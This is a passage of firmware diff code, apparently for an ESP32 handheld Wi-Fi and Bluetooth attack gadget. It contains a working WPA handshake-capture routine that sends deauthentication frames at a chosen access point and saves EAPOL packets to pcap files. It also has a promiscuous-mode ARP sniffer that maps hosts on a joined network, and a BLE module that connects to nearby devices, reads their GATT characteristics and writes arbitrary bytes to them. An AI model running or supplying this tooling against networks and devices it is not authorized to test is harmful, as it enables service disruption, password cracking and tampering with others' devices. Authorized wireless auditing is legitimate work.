+  if (curRow >= 0 && curRow < MAX_ROWS) {
+    int y = TOP + curRow * ROW_H;
+    gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
+    int idx = g_scrollOffset + curRow;
+    if (idx < g_resultCount) {
+      const ScanResult& r = g_results[idx];
+      char line[48];
+      snprintf(line, sizeof(line), "%.20s Ch%d %ddBm", r.essid[0] ? r.essid : "(hidden)", r.channel, r.rssi);
+      u8g2.setFont(u8g2_font_5x8_tf);
+      u8g2.setCursor(UI_MARGIN_X, y);
+      u8g2.print("> ");
+      u8g2.print(line);
+    }
+  }
+
+  display.update();
+}
+
+static void drawTargetSelect() {
+    beginFrame(false);
+    drawHeader("Select Target");
+    u8g2.setFont(u8g2_font_5x8_tf);
+
+    if (g_resultCount == 0) {
+        u8g2.setCursor(UI_MARGIN_X, 50);
+        u8g2.print("Run WiFi Scan first!");
+        drawFooter("hold=back");
+        endFrame();
+        return;
+    }
+
+    for (int i = 0; i < 6 && (g_scrollOffset + i) < g_resultCount; i++) {
+        int idx = g_scrollOffset + i;
+        const ScanResult& r = g_results[idx];
+        int y = 32 + i * 14;
+
+        char line[48];
+        snprintf(line, sizeof(line), "%.20s Ch%d %ddBm", r.essid[0] ? r.essid : "(hidden)", r.channel, r.rssi);
+        u8g2.setCursor(UI_MARGIN_X, y);
+        if (idx == g_cursorIndex) u8g2.print("> ");
+        u8g2.print(line);
+    }
+
+    drawFooter("1x=next  3x=select  hold=back");
+    endFrame();
+}
+
+static void drawHandshakeScreen() {
+    beginFrame(false);
+    drawHeader("Handshake Capture");
+
+    u8g2.setFont(MAIN_FONT);
+    u8g2.setCursor(UI_MARGIN_X, 42);
+    u8g2.print("Target: ");
+    u8g2.print(selectedSSID[0] ? selectedSSID : "None");
+
+    char buf[40];
+    snprintf(buf, sizeof(buf), "EAPOL Packets: %lu", handshakePackets);
+    u8g2.setCursor(UI_MARGIN_X, 65);
+    u8g2.print(buf);
+
+    if (handshakePackets >= 4) {
+        u8g2.setCursor(UI_MARGIN_X, 85);
+        u8g2.print("EAPOL captured; verify capture");
+    } else {
+        u8g2.setCursor(UI_MARGIN_X, 85);
+        u8g2.print("Capturing EAPOL frames...");
+    }
+
+    drawFooter("hold=stop");
+    endFrame();
+}
+
+static bool findClientForBssid(const uint8_t* apBssid, uint8_t* clientMacOut) {
+  uint32_t mostRecent = 0;
+  int      bestIdx    = -1;
+
+  for (int i = 0; i < g_clientCount; i++) {
+    if (memcmp(g_clients[i].apBssid, apBssid, 6) == 0) {
+      if (g_clients[i].lastSeen > mostRecent) {
+        mostRecent = g_clients[i].lastSeen;
+        bestIdx    = i;
+      }
+    }
+  }
+
+  if (bestIdx >= 0) {
+    memcpy(clientMacOut, g_clients[bestIdx].clientMac, 6);
+    return true;
+  }
+  return false;
+}
+
+static void startHandshakeCapture() {
+  if (selectedChannel == 0) {
+    Serial.println("No target selected");
+    return;
+  }
+
+  mode = MODE_HANDSHAKE;
+  attackRunning = true;
+  handshakePackets = 0;
+  waitingForHandshake = false;
+  deauthSentMs = 0;
+  memset(capturedClientMac, 0, sizeof(capturedClientMac));
+  g_hasCapturedClient = false;
+  beaconsCaptured = 0;
+
+  // Try to find a known client for this AP from probe sniffer data
+  if (findClientForBssid(selectedBssid, capturedClientMac)) {
+    g_hasCapturedClient = true;
+    Serial.printf("Pre-loaded client MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+      capturedClientMac[0], capturedClientMac[1], capturedClientMac[2],
+      capturedClientMac[3], capturedClientMac[4], capturedClientMac[5]);
+  } else {
+    Serial.println("No client MAC from probe data, will sniff during capture");
+  }
+
+  uint16_t slot = g_handshakeIndex.next % MAX_HANDSHAKES;
+  char path[32];
+  snprintf(path, sizeof(path), "/handshakes/h%03d.cap", slot);
+
+  pcapFile = FS.open(path, "w");
+  if (pcapFile) {
+    pcap_hdr_t hdr;
+    pcapFile.write((uint8_t*)&hdr, sizeof(hdr));
+
+    HandshakeMeta& s = g_handshakeIndex.sessions[slot];
+    s.timestamp  = millis();
+    strncpy(s.ssid, selectedSSID, 32);
+    s.ssid[32]   = '\0';
+    memcpy(s.bssid, selectedBssid, 6);
+    s.channel    = selectedChannel;
+    s.eapolCount = 0;
+    snprintf(s.filename, sizeof(s.filename), "h%03d.cap", slot);
+
+    if (g_handshakeIndex.count < MAX_HANDSHAKES) g_handshakeIndex.count++;
+    g_handshakeIndex.next = (slot + 1) % MAX_HANDSHAKES;
+    saveHandshakeIndex();
+    Serial.println("PCAP file created");
+  } else {
+    Serial.println("Failed to create PCAP file");
+  }
+
+  WiFi.mode(WIFI_STA);
+  delay(100);
+  WiFi.disconnect();
+  delay(100);
+  esp_wifi_set_max_tx_power(84);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(attackPromiscCallback);
+  esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+  delay(50);
+  Serial.printf("Capture started on %s (Channel %d)\n", selectedSSID, selectedChannel);
+  Serial.printf("Client MAC at start: %02X:%02X:%02X:%02X:%02X:%02X\n",
+    capturedClientMac[0], capturedClientMac[1], capturedClientMac[2],
+    capturedClientMac[3], capturedClientMac[4], capturedClientMac[5]);
+  sendDeauthFrame(selectedBssid, selectedChannel);
+  g_lastAttackMs = millis();
+  drawHandshakeScreen();
+}
+
+static void stopAttack() {
+  attackRunning = false;
+  delay(10);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  delay(10);
+  esp_wifi_set_promiscuous(false);
+  delay(20);
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect(true, true);
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+
+  if (pcapFile) {
+    pcapFile.flush();
+    delay(50);
+    pcapFile.close();
+    Serial.println("PCAP file saved");
+  }
+
+  if (g_handshakeIndex.count > 0) {
+    int lastSlot = (g_handshakeIndex.next - 1 + MAX_HANDSHAKES) % MAX_HANDSHAKES;
+    g_handshakeIndex.sessions[lastSlot].eapolCount = handshakePackets;
+    saveHandshakeIndex();
+  }
+
+  g_hasCapturedClient = false;
+  memset(capturedClientMac, 0, sizeof(capturedClientMac));
+
+  handshakePackets = 0;
+  g_lastAttackMs = 0;
+  lastHandshakeScreenUpdate = 0;
+  waitingForHandshake = false;
+  deauthSentMs = 0;
+  beaconsCaptured = 0;
+  mode = MODE_ATTACK_MENU;
+  drawAttackMenu();
+  resetInputFrontend();
+}
+
+// ============================================================================
+//  ARP scanner
+// ============================================================================
+#define MAX_ARP_ENTRIES 100
+
+struct ArpEntry {
+  uint8_t  mac[6];
+  uint8_t  ip[4];
+  uint32_t firstSeen;
+  uint32_t lastSeen;
+  uint16_t count;
+};
+
+static ArpEntry  g_arpEntries[MAX_ARP_ENTRIES];
+static int       g_arpCount       = 0;
+static bool      g_arpActive      = false;
+static int       g_arpChannel     = 0;
+static uint32_t  g_lastArpHop     = 0;
+static char      g_arpSSID[33]    = "";
+static char      g_arpPass[64]    = "";
+static bool      g_arpConnected   = false;
+static bool      g_arpConfigMode  = false;
+
+static void IRAM_ATTR arpCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!g_arpActive) return;
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+
+  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* payload = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+
+  if (len < 60) return;
+
+  // Look for ARP EtherType (0x08 0x06) after LLC/SNAP header
+  for (int i = 24; i < len - 28; i++) {
+    if (payload[i]     == 0xAA &&
+        payload[i + 1] == 0xAA &&
+        payload[i + 2] == 0x03 &&
+        payload[i + 3] == 0x00 &&
+        payload[i + 4] == 0x00 &&
+        payload[i + 5] == 0x00 &&
+        payload[i + 6] == 0x08 &&
+        payload[i + 7] == 0x06) {
+
+      const uint8_t* arp = payload + i + 8;
+      const uint8_t* senderMac = arp + 8;
+      const uint8_t* senderIp  = arp + 14;
+
+      if (senderMac[0] & 0x01) return;
+      if (senderIp[0] == 0 && senderIp[1] == 0 &&
+          senderIp[2] == 0 && senderIp[3] == 0) return;
+
+      for (int j = 0; j < g_arpCount; j++) {
+        if (memcmp(g_arpEntries[j].mac, senderMac, 6) == 0) {
+          memcpy(g_arpEntries[j].ip, senderIp, 4);
+          g_arpEntries[j].lastSeen = millis();
+          g_arpEntries[j].count++;
+          return;
+        }
+      }
+
+      if (g_arpCount < MAX_ARP_ENTRIES) {
+        memcpy(g_arpEntries[g_arpCount].mac, senderMac, 6);
+        memcpy(g_arpEntries[g_arpCount].ip,  senderIp,  4);
+        g_arpEntries[g_arpCount].firstSeen = millis();
+        g_arpEntries[g_arpCount].lastSeen  = millis();
+        g_arpEntries[g_arpCount].count     = 1;
+        g_arpCount++;
+        Serial.printf("ARP: %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X\n",
+          senderIp[0], senderIp[1], senderIp[2], senderIp[3],
+          senderMac[0], senderMac[1], senderMac[2],
+          senderMac[3], senderMac[4], senderMac[5]);
+      }
+      return;
+    }
+  }
+}
+
+static void drawArpConfigScreen() {
+  beginFrame(false);
+  drawHeader("ARP Scanner");
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+  u8g2.setCursor(UI_MARGIN_X, 30);
+  u8g2.print("NETWORK");
+
+  u8g2.setFont(BOLD_FONT);
+  u8g2.setCursor(UI_MARGIN_X, 42);
+  u8g2.print(ARP_AP_SSID);
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+  u8g2.setCursor(UI_MARGIN_X, 58);
+  u8g2.print("PASSWORD");
+
+  u8g2.setFont(BOLD_FONT);
+  u8g2.setCursor(UI_MARGIN_X, 70);
+  u8g2.print(ARP_AP_PASS);
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+  u8g2.setCursor(UI_MARGIN_X, 86);
+  u8g2.print("OPEN IN BROWSER");
+
+  gfx.drawRoundRect(UI_MARGIN_X, 90, 118, 14, 3, 1);
+  u8g2.setFont(MAIN_FONT);
+  u8g2.setCursor(UI_MARGIN_X + 8, 101);
+  u8g2.print("192.168.5.1");
+
+  drawFooter("hold=cancel");
+  endFrame();
+}
+
+static void startArpScanner() {
+  g_arpCount    = 0;
+  g_arpActive   = false;
+  g_arpChannel  = 0;
+  g_lastArpHop  = 0;
+  g_arpConnected = false;
+  memset(g_arpEntries, 0, sizeof(g_arpEntries));
+
+  // Show connecting screen
+  beginFrame(false);
+  drawHeader("ARP Scanner");
+  u8g2.setFont(MAIN_FONT);
+  u8g2.setCursor(UI_MARGIN_X, 45);
+  u8g2.print("Connecting to:");
+  u8g2.setFont(BOLD_FONT);
+  u8g2.setCursor(UI_MARGIN_X, 60);
+  u8g2.print(g_arpSSID);
+  drawFooter("Please wait...");
+  endFrame();
+
+  // Connect to target network
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(g_arpSSID, g_arpPass);
+
+  uint32_t start = millis();
+  while (WiFi.status() != WL_CONNECTED &&
+         (uint32_t)(millis() - start) < 15000) {
+    delay(200);
+  }
+
+  if (WiFi.status() != WL_CONNECTED) {
+    // Failed to connect
+    beginFrame(false);
+    drawHeader("ARP Scanner");
+    u8g2.setFont(MAIN_FONT);
+    u8g2.setCursor(UI_MARGIN_X, 50);
+    u8g2.print("Connection failed!");
+    u8g2.setCursor(UI_MARGIN_X, 65);
+    u8g2.print("Check credentials");
+    drawFooter("hold=menu");
+    endFrame();
+    Serial.println("ARP: connection failed");
+    return;
+  }
+
+  g_arpConnected = true;
+  Serial.printf("ARP: connected to %s\n", g_arpSSID);
+  Serial.printf("ARP: IP = %s\n", WiFi.localIP().toString().c_str());
+
+  // Now set promiscuous mode to sniff ARP
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&arpCallback);
+
+  g_arpActive = true;
+  Serial.println("ARP scanner started");
+  drawArpScreen();
+}
+
+static void stopArpScanner() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  WiFi.disconnect(true, true);
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+  esp_wifi_stop();
+  g_arpActive    = false;
+  g_arpConnected = false;
+  saveArpSession();
+  Serial.printf("ARP scanner stopped. %d entries found.\n", g_arpCount);
+}
+
+static void saveArpSession() {
+  if (g_arpCount == 0) return;
+  if (!g_arpSessionIndexLoaded) loadArpSessionIndex();
+
+  uint16_t slot = g_arpSessionNext % MAX_ARP_SESSIONS;
+  char path[32];
+  snprintf(path, sizeof(path), "/arp/a%03d.csv", slot);
+
+  File f = FS.open(path, "w");
+  if (!f) return;
+
+  f.print("IP,MAC,FIRST_SEEN,LAST_SEEN,COUNT,NETWORK\r\n");
+  for (int i = 0; i < g_arpCount; i++) {
+    const ArpEntry& e = g_arpEntries[i];
+    char bf[18];
+    bssidFull(e.mac, bf, sizeof(bf));
+    f.print(e.ip[0]); f.print("."); f.print(e.ip[1]);
+    f.print("."); f.print(e.ip[2]); f.print("."); f.print(e.ip[3]);
+    f.print(","); f.print(bf);
+    f.print(","); f.print(e.firstSeen / 1000);
+    f.print(","); f.print(e.lastSeen / 1000);
+    f.print(","); f.print(e.count);
+    f.print(","); fileCsvEscaped(f, g_arpSSID);
+    f.print("\r\n");
+  }
+  f.close();
+
+  if (g_arpSessionTotal < MAX_ARP_SESSIONS) g_arpSessionTotal++;
+  g_arpSessionNext = (slot + 1) % MAX_ARP_SESSIONS;
+  saveArpSessionIndex();
+  Serial.printf("ARP session saved: %d entries\n", g_arpCount);
+}
+
+static void drawArpScreen() {
+  beginFrame(false);
+  drawHeader("ARP Scanner");
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+
+  if (g_arpCount == 0) {
+    u8g2.setFont(MAIN_FONT);
+    u8g2.setCursor(UI_MARGIN_X, 42);
+    u8g2.print("Listening for ARP...");
+    drawFooter("hold=menu");
+    endFrame();
+    return;
+  }
+
+  const int ROWS  = 8;
+  const int ROW_H = 11;
+  const int TOP   = 28;
+
+  int shown = 0;
+  for (int i = g_arpCount - 1; i >= 0 && shown < ROWS; i--) {
+    const ArpEntry& e = g_arpEntries[i];
+    int y = TOP + (shown * ROW_H);
+    shown++;
+
+    char line[40];
+    snprintf(line, sizeof(line), "%d.%d.%d.%d",
+      e.ip[0], e.ip[1], e.ip[2], e.ip[3]);
+
+    char bs[6];
+    bssidShort(e.mac, bs, sizeof(bs));
+
+    char full[48];
+    snprintf(full, sizeof(full), "%s  %s", line, bs);
+
+    u8g2.setCursor(UI_MARGIN_X, y);
+    u8g2.print(full);
+  }
+
+  char footer[48];
+  snprintf(footer, sizeof(footer), "%d devices  ch%d  hold=menu", g_arpCount, g_arpChannel);
+  drawFooter(footer);
+  endFrame();
+}
+
+// ============================================================================
+//  BLE scanner start / stop / draw
+// ============================================================================
+static void startBleScanner() {
+  g_bleCount       = 0;
+  g_bleSelectedIdx = -1;
+  g_blePrevSelected = -1;
+  g_bleConnected   = false;
+  g_bleCharCount   = 0;
+  g_bleScrollOffset = 0;
+  memset(g_bleDevices, 0, sizeof(g_bleDevices));
+
+  // Show starting screen
+  beginFrame(false);
+  drawHeader("BLE Scanner");
+  u8g2.setFont(MAIN_FONT);
+  u8g2.setCursor(UI_MARGIN_X, 45);
+  u8g2.print("Starting BLE scan...");
+  drawFooter("Please wait...");
+  endFrame();
+
+  BLEDevice::init("");
+  g_bleScan = BLEDevice::getScan();
+  g_bleScan->setAdvertisedDeviceCallbacks(&g_bleCallback);
+  g_bleScan->setActiveScan(true);   // active scan = request scan response
+  g_bleScan->setInterval(100);
+  g_bleScan->setWindow(99);
+
+  g_bleActive = true;
+  g_bleScan->start(0, nullptr, false); // 0 = scan forever
+  Serial.println("BLE scanner started");
+  drawBleScreen();
+}
+
+static void stopBleScanner() {
+  g_bleActive = false;
+  if (g_bleScan) {
+    g_bleScan->stop();
+    g_bleScan->clearResults();
+  }
+  BLEDevice::deinit(true);
+  delay(100);
+  saveBleSession();
+  Serial.printf("BLE scanner stopped. %d devices found.\n", g_bleCount);
+}
+
+static void drawBleScreen() {
+  beginFrame(false);
+  drawHeader("BLE Scanner");
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+
+  if (g_bleCount == 0) {
+    u8g2.setFont(MAIN_FONT);
+    u8g2.setCursor(UI_MARGIN_X, 42);
+    u8g2.print("Scanning for BLE...");
+    drawFooter("hold=menu");
+    endFrame();
+    return;
+  }
+
+  const int ROWS  = 8;
+  const int ROW_H = 11;
+  const int TOP   = 28;
+
+  int shown = 0;
+  for (int i = g_bleScrollOffset; i < g_bleCount && shown < ROWS; i++) {
+    const BleDevice& d = g_bleDevices[i];
+    int y = TOP + (shown * ROW_H);
+    shown++;
+
+    const char* tag = "   ";
+    if (d.isApple)          tag = "APL";
+    else if (d.isSamsung)   tag = "SAM";
+    else if (d.isFitness)   tag = "FIT";
+    else if (d.isIoT)       tag = "IOT";
+    else if (d.connectable) tag = "CON";
+
+    char bs[6];
+    bssidShort(d.mac, bs, sizeof(bs));
+
+    char line[40];
+    snprintf(line, sizeof(line), "%s%s %s %s %ddBm",
+      (i == g_bleSelectedIdx) ? ">" : " ",
+      tag,
+      bs,
+      d.name[0] ? d.name : "?",
+      d.rssi);
+    line[38] = '\0';
+
+    u8g2.setCursor(UI_MARGIN_X, y);
+    u8g2.print(line);
+  }
+
+  int iotCount = 0;
+  int conCount = 0;
+  for (int i = 0; i < g_bleCount; i++) {
+    if (g_bleDevices[i].isIoT)       iotCount++;
+    if (g_bleDevices[i].connectable) conCount++;
+  }
+
+  char footer[48];
+  snprintf(footer, sizeof(footer), "%d dev  %d IoT  %d conn  1x=sel 3x=detail",
+    g_bleCount, iotCount, conCount);
+  drawFooter(footer);
+  endFrame();
+}
+
+// ============================================================================
+//  BLE session storage
+// ============================================================================
+static void loadBleSessionIndex() {
+  File f = FS.open("/ble/index.bin", "r");
+  if (!f) {
+    g_bleScanNext  = 0;
+    g_bleScanTotal = 0;
+    g_bleIndexLoaded = true;
+    return;
+  }
+  const size_t expected = sizeof(g_bleScanNext) + sizeof(g_bleScanTotal);
+  if (f.size() != expected) {
+    f.close();
+    g_bleScanNext = 0;
+    g_bleScanTotal = 0;
+    g_bleIndexLoaded = true;
+    return;
+  }
+  if (f.read((uint8_t*)&g_bleScanNext, sizeof(g_bleScanNext)) != sizeof(g_bleScanNext) ||
+      f.read((uint8_t*)&g_bleScanTotal, sizeof(g_bleScanTotal)) != sizeof(g_bleScanTotal)) {
+    g_bleScanNext = 0;
+    g_bleScanTotal = 0;
+  }
+  f.close();
+  g_bleIndexLoaded = true;
+}
+
+static void saveBleSessionIndex() {
+  File f = FS.open("/ble/index.bin", "w");
+  if (!f) return;
+  f.write((const uint8_t*)&g_bleScanNext,  sizeof(g_bleScanNext));
+  f.write((const uint8_t*)&g_bleScanTotal, sizeof(g_bleScanTotal));
+  f.close();
+}
+
+static void saveBleSession() {
+  if (g_bleCount == 0) return;
+  if (!g_bleIndexLoaded) loadBleSessionIndex();
+
+  uint16_t slot = g_bleScanNext % MAX_BLE_SESSIONS;
+  char path[32];
+  snprintf(path, sizeof(path), "/ble/b%03d.csv", slot);
+
+  File f = FS.open(path, "w");
+  if (!f) return;
+
+  f.print("MAC,NAME,RSSI,VENDOR,TYPE,CONNECTABLE,SERVICES,FIRST_SEEN,LAST_SEEN,COUNT\r\n");
+  for (int i = 0; i < g_bleCount; i++) {
+    const BleDevice& d = g_bleDevices[i];
+    char bf[18];
+    bssidFull(d.mac, bf, sizeof(bf));
+
+    const char* type = "Generic";
+    if (d.isApple)        type = "Apple";
+    else if (d.isSamsung) type = "Samsung";
+    else if (d.isFitness) type = "Fitness";
+    else if (d.isIoT)     type = "IoT";
+
+    f.print(bf);
+    f.print(","); fileCsvEscaped(f, d.name[0] ? d.name : "(unnamed)");
+    f.print(","); f.print(d.rssi);
+    f.print(","); f.print(bleVendorName(d.manufacturer));
+    f.print(","); f.print(type);
+    f.print(","); f.print(d.connectable ? "yes" : "no");
+    f.print(","); f.print(d.serviceCount);
+    f.print(","); f.print(d.firstSeen / 1000);
+    f.print(","); f.print(d.lastSeen / 1000);
+    f.print(","); f.print(d.count);
+    f.print("\r\n");
+  }
+  f.close();
+
+  if (g_bleScanTotal < MAX_BLE_SESSIONS) g_bleScanTotal++;
+  g_bleScanNext = (slot + 1) % MAX_BLE_SESSIONS;
+  saveBleSessionIndex();
+  Serial.printf("BLE session saved: %d devices\n", g_bleCount);
+}
+
+// ============================================================================
+//  BLE GATT inspection - connect, enumerate, read, write
+// ============================================================================
+static void drawBleDetail() {
+  beginFrame(false);
+  drawHeader("BLE Device");
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+
+  if (g_bleSelectedIdx < 0 || g_bleSelectedIdx >= g_bleCount) {
+    u8g2.setCursor(UI_MARGIN_X, 50);
+    u8g2.print("No device selected");
+    drawFooter("hold=back");
+    endFrame();
+    return;
+  }
+
+  const BleDevice& d = g_bleDevices[g_bleSelectedIdx];
+
+  const int X  = UI_MARGIN_X;
+  const int Y  = 28;
+  const int DY = 11;
+
+  char bf[18];
+  bssidFull(d.mac, bf, sizeof(bf));
+
+  u8g2.setCursor(X, Y);
+  u8g2.print("MAC:  "); u8g2.print(bf);
+
+  u8g2.setCursor(X, Y + DY);
+  u8g2.print("Name: ");
+  u8g2.print(d.name[0] ? d.name : "(unnamed)");
+
+  u8g2.setCursor(X, Y + DY * 2);
+  u8g2.print("Vendor: ");
+  u8g2.print(bleVendorName(d.manufacturer));
+
+  u8g2.setCursor(X, Y + DY * 3);
+  char rssiLine[32];
+  snprintf(rssiLine, sizeof(rssiLine), "RSSI: %d dBm", d.rssi);
+  u8g2.print(rssiLine);
+
+  u8g2.setCursor(X, Y + DY * 4);
+  char charLine[32];
+  snprintf(charLine, sizeof(charLine), "Services: %d  Chars: %d",
+    d.serviceCount, g_bleCharCount);
+  u8g2.print(charLine);
+
+  if (g_bleConnected) {
+    u8g2.setCursor(X, Y + DY * 5);
+    u8g2.print("Status: CONNECTED");
+    drawFooter("2x=inspect  3x=inspect  hold=back");
+  } else {
+    u8g2.setCursor(X, Y + DY * 5);
+    u8g2.print("Status: not connected");
+    drawFooter("2x=connect  hold=back");
+  }
+
+  endFrame();
+}
+
+static void drawBleExploit() {
+  beginFrame(false);
+  drawHeader("BLE GATT");
+
+  u8g2.setFont(u8g2_font_5x8_tf);
+
+  if (g_bleCharCount == 0) {
+    u8g2.setCursor(UI_MARGIN_X, 42);
+    u8g2.print("No characteristics found");
+    drawFooter("hold=back");
+    endFrame();
+    return;
+  }
+
+  const int ROWS  = 7;
+  const int ROW_H = 11;
+  const int TOP   = 28;
+
+  int shown = 0;
+  for (int i = 0; i < g_bleCharCount && shown < ROWS; i++) {
+    const BleCharInfo& c = g_bleChars[i];
+    int y = TOP + (shown * ROW_H);
+    shown++;
+
+    char flags[8] = "";
+    if (c.canRead)   strcat(flags, "R");
+    if (c.canWrite)  strcat(flags, "W");
+    if (c.canNotify) strcat(flags, "N");
+
+    char line[40];
+    // Show last 8 chars of UUID to fit screen
+    const char* shortUuid = c.uuid + (strlen(c.uuid) > 8 ? strlen(c.uuid) - 8 : 0);
+    snprintf(line, sizeof(line), "...%s [%s]", shortUuid, flags);
+
+    u8g2.setCursor(UI_MARGIN_X, y);
+    u8g2.print(line);
+
+    // Show value if read
+    if (c.valueLen > 0) {
+      char val[16] = "";
+      for (int j = 0; j < min((int)c.valueLen, 4); j++) {
+        char hex[4];
+        snprintf(hex, sizeof(hex), "%02X ", c.value[j]);
+        strcat(val, hex);
+      }
+      u8g2.setCursor(SCREEN_W / 2, y);
+      u8g2.print(val);
+    }
+  }
+
+  drawFooter("hold=back");
+  endFrame();
+}
+
+static bool connectBleDevice(int idx) {
+  if (idx < 0 || idx >= g_bleCount) return false;
+
+  BleDevice& d = g_bleDevices[idx];
+
+  // Show connecting screen
+  beginFrame(false);
+  drawHeader("BLE Connect");
+  u8g2.setFont(MAIN_FONT);
+  u8g2.setCursor(UI_MARGIN_X, 42);
+  u8g2.print("Connecting to:");
+  u8g2.setCursor(UI_MARGIN_X, 56);
+  u8g2.print(d.name[0] ? d.name : "(unnamed)");
+  drawFooter("Please wait...");
+  endFrame();
+
+  // Stop scanning while connecting
+  if (g_bleScan) g_bleScan->stop();
+
+  g_bleClient = BLEDevice::createClient();
+  if (!g_bleClient) {
+    Serial.println("BLE: failed to create client");
+    return false;
+  }
+
+  // Build address string from MAC
+  char addrStr[18];
+  snprintf(addrStr, sizeof(addrStr),
+    "%02x:%02x:%02x:%02x:%02x:%02x",
+    d.mac[5], d.mac[4], d.mac[3],
+    d.mac[2], d.mac[1], d.mac[0]);
+
+  BLEAddress bleAddr(addrStr);
+
+  if (!g_bleClient->connect(bleAddr)) {
+    Serial.println("BLE: connection failed");
+    delete g_bleClient;
+    g_bleClient = nullptr;
+    return false;
+  }
+
+  Serial.println("BLE: connected");
+  g_bleConnected = true;
+  g_bleCharCount = 0;
+
+  // Enumerate services and characteristics
+  std::map<std::string, BLERemoteService*>* services =
+    g_bleClient->getServices();
+
+  if (services) {
+    for (auto& svc : *services) {
+      Serial.printf("BLE Service: %s\n", svc.first.c_str());
+
+      std::map<std::string, BLERemoteCharacteristic*>* chars =
+        svc.second->getCharacteristics();
+
+      if (chars) {
+        for (auto& ch : *chars) {
+          if (g_bleCharCount >= 20) break;
+
+          BleCharInfo& info = g_bleChars[g_bleCharCount];
+          memset(&info, 0, sizeof(info));
+
+          strncpy(info.uuid, ch.first.c_str(), 36);
+          info.uuid[36] = '\0';
+
+          info.canRead   = ch.second->canRead();
+          info.canWrite  = ch.second->canWrite();
+          info.canNotify = ch.second->canNotify();
+
+          // Try to read value
+          if (info.canRead) {
+            String val = ch.second->readValue();
+            info.valueLen = min((int)val.length(), 32);
+            memcpy(info.value, val.c_str(), info.valueLen);
+            Serial.printf("  Char: %s = ", info.uuid);
+            for (int i = 0; i < info.valueLen; i++) {
+              Serial.printf("%02X ", info.value[i]);
+            }
+            Serial.println();
+          }
+
+          g_bleCharCount++;
+        }
+      }
+    }
+  }
+
+  Serial.printf("BLE: enumerated %d characteristics\n", g_bleCharCount);
+  return true;
+}
+
+static void disconnectBleDevice() {
+  if (g_bleClient) {
+    g_bleClient->disconnect();
+    delete g_bleClient;
+    g_bleClient = nullptr;
+  }
+  g_bleConnected = false;
+  g_bleCharCount = 0;
+
+  // Restart scan
+  if (g_bleScan && g_bleActive) {
+    g_bleScan->start(0, nullptr, false);
+  }
+}
+
+static void tryBleWrite(int charIdx, const uint8_t* data, size_t len) {
+  if (!g_bleConnected || !g_bleClient) return;
+  if (charIdx < 0 || charIdx >= g_bleCharCount) return;
+  if (!g_bleChars[charIdx].canWrite) return;
+
+  // Get the characteristic
+  std::map<std::string, BLERemoteService*>* services =
+    g_bleClient->getServices();
+
+  if (!services) return;
+
+  int idx = 0;
+  for (auto& svc : *services) {
+    std::map<std::string, BLERemoteCharacteristic*>* chars =
+      svc.second->getCharacteristics();
+    if (!chars) continue;
+    for (auto& ch : *chars) {
+      if (idx == charIdx) {
+        ch.second->writeValue((uint8_t*)data, len, true);
+        Serial.printf("BLE: wrote %d bytes to %s\n", len, g_bleChars[charIdx].uuid);
+        return;
+      }
+      idx++;
+    }
+  }
+}
+
+static void updateBleCursor() {
+  display.fastmodeOn();
+
+  const int ROWS  = 8;
+  const int ROW_H = 11;
+  const int TOP   = 28;
+
+  // Erase and redraw previous row without cursor
+  if (g_blePrevSelected >= 0 && g_blePrevSelected < g_bleCount) {
+    int prevRow = g_blePrevSelected - g_bleScrollOffset;
+    if (prevRow >= 0 && prevRow < ROWS) {
+      int y = TOP + prevRow * ROW_H;
+      gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
+      const BleDevice& d = g_bleDevices[g_blePrevSelected];
+
+      const char* tag = "   ";
+      if (d.isApple)          tag = "APL";
+      else if (d.isSamsung)   tag = "SAM";
+      else if (d.isFitness)   tag = "FIT";
+      else if (d.isIoT)       tag = "IOT";
+      else if (d.connectable) tag = "CON";
+
+      char bs[6];
+      bssidShort(d.mac, bs, sizeof(bs));
+      char line[40];
+      snprintf(line, sizeof(line), "%s %s %s %ddBm",
+        tag, bs, d.name[0] ? d.name : "?", d.rssi);
+      line[38] = '\0';
+      u8g2.setFont(u8g2_font_5x8_tf);
+      u8g2.setCursor(UI_MARGIN_X, y);
+      u8g2.print(line);       // no prefix
+    }
+  }
+
+  // Erase and redraw current row with cursor
+  if (g_bleSelectedIdx >= 0 && g_bleSelectedIdx < g_bleCount) {
+    int curRow = g_bleSelectedIdx - g_bleScrollOffset;
+    if (curRow >= 0 && curRow < ROWS) {
+      int y = TOP + curRow * ROW_H;
+      gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
+      const BleDevice& d = g_bleDevices[g_bleSelectedIdx];
+
+      const char* tag = "   ";
+      if (d.isApple)          tag = "APL";
+      else if (d.isSamsung)   tag = "SAM";
+      else if (d.isFitness)   tag = "FIT";
+      else if (d.isIoT)       tag = "IOT";
+      else if (d.connectable) tag = "CON";
+
+      char bs[6];
+      bssidShort(d.mac, bs, sizeof(bs));
+      char line[40];
+      snprintf(line, sizeof(line), "%s %s %s %ddBm",
+        tag, bs, d.name[0] ? d.name : "?", d.rssi);
+      line[38] = '\0';
+      u8g2.setFont(u8g2_font_5x8_tf);
+      u8g2.setCursor(UI_MARGIN_X, y);
+      u8g2.print("> ");       // prefix as separate print
+      u8g2.print(line);       // text shifted right
+    }
+  }
+
